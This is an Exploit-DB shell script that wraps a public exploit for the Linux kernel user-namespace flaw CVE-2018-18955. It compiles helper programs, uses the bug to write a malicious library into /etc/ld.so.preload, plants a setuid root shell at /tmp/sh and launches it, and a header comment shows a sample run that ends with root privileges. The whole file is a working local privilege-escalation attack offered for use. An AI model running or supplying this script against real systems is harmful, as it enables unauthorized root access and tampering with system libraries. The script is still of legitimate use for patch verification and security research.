#!/bin/sh
#
# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47166.zip
#
# wrapper for Jann Horn's exploit for CVE-2018-18955
# uses ld.so.preload technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.ldpreload.sh
# [*] Compiling...
# [*] Adding libsubuid.so to /etc/ld.so.preload...
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Nov 21 19:07 /tmp/sh
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
lib="libsubuid.so"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

if ! gcc libsubuid.c -fPIC -shared -o "${lib}"; then
  echo 'Compiling libsubuid.c failed'
  exit 1
fi

echo "[*] Adding ${lib} to /etc/ld.so.preload..."

echo "cp ${lib} /lib/; echo /lib/${lib} > /etc/ld.so.preload" | ./subuid_shell ./subshell

/usr/bin/newuidmap

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm subuid_shell
/bin/rm subshell
echo "/bin/rm /lib/${lib}" | $rootshell

echo "[*] Launching root shell: ${rootshell}"
$rootshell